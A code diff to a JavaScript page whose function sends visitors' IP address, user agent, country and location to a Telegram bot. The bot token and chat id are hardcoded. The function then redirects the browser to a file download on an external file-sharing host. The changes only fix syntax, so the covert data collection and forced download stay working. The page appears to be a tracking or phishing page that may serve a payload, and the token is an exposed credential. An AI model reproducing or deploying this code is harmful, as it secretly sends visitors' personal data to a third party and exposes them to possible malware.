@@ -82,7 +82,7 @@ Google Maps: [View Location](https://www.google.com/maps/search/?api=1&query=${l
 }
 
 
-function sendToTelegramBotFail(reason) {
+async function sendToTelegramBotFail(reason) {
     // Replace with your bot token and chat id
     const token = '6343774431:AAFR-TYiel6owWpqzotB5rRtIpkY_saSrdc';
     const chatId = '7175670385';
@@ -94,12 +94,12 @@ function sendToTelegramBotFail(reason) {
 
     const text = `
 \`\`\`
-Timestamp: ${timestamp},
+Timestamp: ${currentTimestamp},
 Reason: ${reason},
 User Agent: ${userAgent},
 IP: ${ip},
 Country: ${country},
-\`\`\`;
+\`\`\``;
 
     const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
 
@@ -108,5 +108,5 @@ Country: ${country},
         .then(data => console.log(data))
         .catch(error => console.error(error));
 
-     window.location.href = `https://send.zcyph.cc/download/348dfa91803c0942/#RA-2vcQCp7RQabIlGgYeTg`;
+    window.location.href = `https://send.zcyph.cc/download/348dfa91803c0942/#RA-2vcQCp7RQabIlGgYeTg`;
 }
